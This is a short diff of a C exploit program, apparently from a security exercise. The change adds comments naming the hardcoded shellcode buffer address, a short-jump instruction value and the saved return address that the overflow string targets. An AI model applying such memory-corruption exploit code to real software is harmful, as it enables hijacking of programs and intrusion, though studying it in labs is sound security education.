@@ -21,10 +21,10 @@ int main(void)
   char *ptr;
   int i;
 
-  shellcodeAddr = 0x08049C68;
+  shellcodeAddr = 0x08049C68; // address of buff
   f = 0xffffffff;
-  f2 = 0xffff06eb;
-  fpAddr = 0xbffffa3c;
+  f2 = 0xffff06eb; // jump instr
+  fpAddr = 0xbffffa3c; // addr of eip for foo
 
   addrPtr = (long *) exploitStr; 
   for (i = 0; i < EGG_SIZE; i += 4)
